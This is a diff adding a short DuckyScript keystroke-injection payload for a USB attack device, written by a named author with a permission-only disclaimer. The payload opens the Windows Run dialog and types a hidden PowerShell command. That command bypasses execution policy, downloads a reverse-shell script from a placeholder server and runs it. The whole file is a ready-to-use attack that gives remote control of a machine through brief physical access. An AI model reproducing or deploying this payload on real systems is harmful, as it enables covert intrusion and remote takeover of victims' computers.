@@ -1,0 +1,20 @@
+REM ------------------------------------
+REM Description: Downloads a reverse shell script and runs it
+REM Author: P-ict0 (https://github.com/P-ict0)
+REM Date: 20/01/2025
+REM THIS SCRIPT IS INTENDED FOR USE ON SYSTEMS YOU OWN OR HAVE BEEN GIVEN PERMISSION TO USE, I TAKE NO RESPONSIBILITIES FOR ANY MISUSE
+REM ------------------------------------
+REM This script:
+REM 1. Opens a powershell terminal
+REM 2. Fetches a revserse shell from a server and runs it hidden
+REM ------------------------------------
+
+DELAY 100
+
+REM Open run dialog
+GUI r
+DELAY 500
+
+REM Download and run script
+STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr http://your.server:port/reverse_shell.ps1; invoke-expression $pl
+ENTER
